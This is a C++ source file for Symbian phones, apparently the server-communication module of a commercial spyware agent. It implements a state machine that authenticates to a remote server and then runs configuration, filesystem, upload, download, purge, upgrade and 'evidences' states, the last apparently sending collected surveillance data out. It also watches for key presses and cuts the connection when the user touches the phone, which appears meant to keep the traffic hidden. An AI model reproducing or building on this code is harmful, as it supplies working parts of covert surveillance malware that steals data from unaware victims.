/*
 ============================================================================
 Name		: Protocol.cpp
 Author	  : Marco Bellino - rewritten by jo'
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CProtocol implementation
 ============================================================================
 */
#include "Protocol.h"
#include <e32std.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>
#include "AbstractState.h"
#include "StateAuthentication.h"
#include "StateIdentification.h"
#include "StateNone.h"
#include "StateBye.h"
#include "StateEvidences.h"
#include "StateNewConf.h"
#include "StateNewConfFeedback.h"
#include "StateFileSystem.h"
#include "StateDownload.h"
#include "StateUpload.h"
#include "StatePurge.h"
#include "StateUpgrade.h"



CProtocol::CProtocol(MProtocolNotifier& aNotifier) :
	iNotifier(aNotifier),iStates(2)
	{
	iHost.Zero();
	//iCookie.Zero();
	iSessionKey.Zero();
	//iStopped = EFalse;
	}

CProtocol::~CProtocol()
	{
	__FLOG(_L("Destructor"));
	delete iCurrentState;
	iStates.Close();
	delete iNetwork;
	delete iUserMonitor;
	delete iCookie;
	__FLOG(_L("EndDestructor"));
	__FLOG_CLOSE;
	}

CProtocol* CProtocol::NewLC(MProtocolNotifier& aNotifier)
	{
	CProtocol* self = new (ELeave) CProtocol(aNotifier);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CProtocol* CProtocol::NewL(MProtocolNotifier& aNotifier)
	{
	CProtocol* self = CProtocol::NewLC(aNotifier);
	CleanupStack::Pop(); // self;
	return self;
	}

void CProtocol::ConstructL()
	{
	__FLOG_OPEN("HT", "Protocol.txt");
	__FLOG(_L("------------"));
	
	iCurrentState = CStateNone::NewL(*this);
	iCookie = NULL;
	
	iUserMonitor = NULL;
	}

void CProtocol::StartRestProtocolL(TBool aMonitor,RSocketServ& aSocketServ, RConnection& aConnection, const TDesC& aServer, TInt aPort)
	{
	iHost.Copy(aServer);
	iServer.Copy(aServer);
	iPort = aPort;
	
	__FLOG(_L("Connect To Server..."));
	delete iNetwork;
	iNetwork = NULL;
	iNetwork = CNetwork::NewL(aSocketServ, aConnection, *this);

	//activate user monitor
	if(aMonitor)
		{
		delete iUserMonitor;
		iUserMonitor = NULL;
		iUserMonitor = CEventCapturer::NewL(*this); 
		iUserMonitor->Listen();
		}
	// Append states to the states list in the ordered sequence
	iStates.AppendL(EState_Identification);
	iStates.AppendL(EState_Evidences);
	iStates.AppendL(EState_Bye);
	// start the first state
	CAbstractState* authentication = CStateAuthentication::NewL(*this);
	delete iCurrentState;
	iCurrentState = authentication;
		
	TRAPD(err,iNetwork->ConnectToServerL( aServer, aPort));
	if(err != KErrNone)
		{
		__FLOG(_L("Trapped error on ConnectToServer"));
		EndProtocolL(err);
		}
	__FLOG(_L("StartRestProtocolL exit"));
	}

void CProtocol::NotifyConnectionCompleteL()
	{
	__FLOG(_L("Connected!"));
	__FLOG_1(_L("Activate State: %d"), iCurrentState->Type());
	iCurrentState->ActivateL(iSessionKey);
	}


void CProtocol::SetAvailables(TInt aNumAvailables,const TDesC8& aAvailables)
	{
	TUint8* ptr = (TUint8 *)aAvailables.Ptr();
	for(TInt i=0;i<aNumAvailables; i++)
		{
		//retrieve the available type
		TUint32 available;
		Mem::Copy(&available,ptr,4);  //4=sizeof(TUint32)
		ptr += 4;
		//add the available to the list of states, immediately before the evidences state
		iStates.Insert(available,iStates.Count()-2);  //-2, last 2 states are always evidences and bye
		if(available == EState_NewConf)
			{
			iStates.Insert(EState_NewConf_Feedback,iStates.Count()-2);
			}
		}
	}


void CProtocol::ChangeStateL(TInt aError)
	{
	//if(iStopped)
	//	return;
	
	iNetwork->Disconnect();
	
	TInt state = GetNextState();
	__FLOG_1(_L("ChangeStateL, nextState: %d"), state);
	switch(state)
		{
		case EState_Identification:
			{
			CAbstractState* ident = CStateIdentification::NewL(*this);
			delete iCurrentState;
			iCurrentState = ident;
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_NewConf:
			{
			CAbstractState* newConf = CStateNewConf::NewL(*this);
			delete iCurrentState;
			iCurrentState = newConf;
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_NewConf_Feedback:
			{
			CAbstractState* newConfFeedback = CStateNewConfFeedback::NewL(*this);
			delete iCurrentState;
			iCurrentState = newConfFeedback;
			
			// this state has been added as an extension to the original REST
			// we have to pass the error condition from newconf state
			CStateNewConfFeedback* slave;
			slave = (CStateNewConfFeedback*) iCurrentState;
			slave->SetError(aError);
			
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_FileSystem:
			{
			CAbstractState* fileSystem = CStateFileSystem::NewL(*this);
			delete iCurrentState;
			iCurrentState = fileSystem;
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_Purge:
			{
			CAbstractState* purge = CStatePurge::NewL(*this);
			delete iCurrentState;
			iCurrentState = purge;
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_Download:
			{
			CAbstractState* download = CStateDownload::NewL(*this);
			delete iCurrentState;
			iCurrentState = download;
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_Upload:
			{
			CAbstractState* upload = CStateUpload::NewL(*this);
			delete iCurrentState;
			iCurrentState = upload;
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_Evidences:
			{
			CAbstractState* evidences = CStateEvidences::NewL(*this);
			delete iCurrentState;
			iCurrentState = evidences;
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_Bye:
			{
			CAbstractState* bye = CStateBye::NewL(*this);
			delete iCurrentState;
			iCurrentState = bye;
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_Upgrade:
			{
			CAbstractState* bye = CStateUpgrade::NewL(*this);
			delete iCurrentState;
			iCurrentState = bye;
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err!=KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		case EState_None:
			{
			EndProtocolL(KErrNone);
			}
			break;
		default:
			{
			//iNetwork->ConnectToServerL(iServer,iPort);  //TODO:restore this if some problems arise
			//TODO: think about
			ChangeStateL(KErrNone);
			}
			break;
		}
	}

void CProtocol::SendStateDataL(const TDesC8& data)
	{
	__FLOG_1(_L("Outgoing Data State: %d"), iCurrentState->Type());
	//if(iStopped)
	//	return;
	iNetwork->SendL(data);
	}

void CProtocol::NewConfigAvailable()
	{
	__FLOG(_L("New config file!"));
	iNotifier.NewConfigDownloaded();
	}

void CProtocol::UpgradeAvailable()
	{
	iNotifier.NewUpgradeDownloaded();
	}

void CProtocol::NotifyDataReceivedL(const TDesC8& aData)
	{
	__FLOG_1(_L("Incoming Data State: %d"), iCurrentState->Type());
	//if(iStopped)
	//	return;
	iCurrentState->ProcessDataL(aData);
	}

void CProtocol::NotifySendingCompleteL()
	{
	__FLOG(_L("Data Sent!"));
	if (iCurrentState->Type() == EState_None)
		{
		iNetwork->Disconnect();
		return;
		}
	}

void CProtocol::NotifyDisconnectionCompleteL()
	{
	__FLOG_1(_L("Disconnection State: %d"), iCurrentState->Type());
	
	}

void CProtocol::NotifyNetworkError(TInt aError)
	{
	__FLOG_2(_L("Network Error:%d  State:%d"), aError, iCurrentState->Type());
	//iStopped = ETrue;
	EndProtocolL(aError);
	}

void CProtocol::EndProtocolL(TInt aError)
	{
	__FLOG_1(_L("EndProtocolL: %d"), aError);
	delete iCurrentState;
	iCurrentState = NULL;
	if(iUserMonitor)
		{
		delete iUserMonitor;
		iUserMonitor = NULL;
		}
	iNotifier.ConnectionTerminatedL(aError);
	}

HBufC8* CProtocol::GetRequestHeaderL()
	{
	HBufC8* result;
	if(iCookie == NULL)
		{
		result = CRestUtils::GetRestHeaderL(iHost,KNullDesC8);
		}
	else
		{
		result = CRestUtils::GetRestHeaderL(iHost,*iCookie);
		}
	return result;
	}

void CProtocol::SetCookie(const TDesC8& aCookie)
	{
	delete iCookie;
	iCookie = HBufC8::NewL(aCookie.Size());
	iCookie->Des().Copy(aCookie);
	//iCookie.Copy(aCookie);
	}

void CProtocol::SetKey(const TDesC8& aKey)
	{
	iSessionKey.Copy(aKey);
	}

void CProtocol::ReConnect()
	{
	//if(iStopped)
		//return;
	__FLOG_1(_L("Reconnect State: %d"), iCurrentState->Type());
	iNetwork->Disconnect();
	TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
	if(err != KErrNone)
		{
		EndProtocolL(err);
		}
	}

void CProtocol::ResponseError(TInt aError)
	{
	//if(iStopped)
		//return;
	//with KErrAuth simply close connection
	//with other errors send bye
	__FLOG_1(_L("Response error: %d"), aError);
	switch(aError)
		{
		case KErrAuth:
			{
			/*
			if(iUserMonitor)
				{
				delete iUserMonitor;
				iUserMonitor = NULL;
				}
			iNetwork->Disconnect();
			iNotifier.ConnectionTerminatedL(aError);
			*/
			iNetwork->Disconnect();
			EndProtocolL(aError);
			}
			break;
		case KErrContent:
		case KErrSha:
		case KErrNotOk:
		default:
			{
			iNetwork->Disconnect();
			CAbstractState* bye = CStateBye::NewL(*this);
			delete iCurrentState;
			iCurrentState = bye;
			iStates.Reset();
			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
			if(err != KErrNone)
				{
				EndProtocolL(err);
				}
			}
			break;
		}
	}


TInt CProtocol::GetNextState()
	{
	if(iStates.Count()>0)
		{
		TInt nextState(iStates[0]);
		iStates.Remove(0);
		return nextState;
		}
	return 0;
	}


TBool CProtocol::KeyEventCaptured(TWsEvent aEvent)
	{
	__FLOG(_L("KeyEventCaptured()"));	
	iNetwork->Disconnect();
	
	EndProtocolL(KErrNone);
	//iNotifier.ConnectionTerminatedL(KErrNone);
	
	return ETrue;
	}

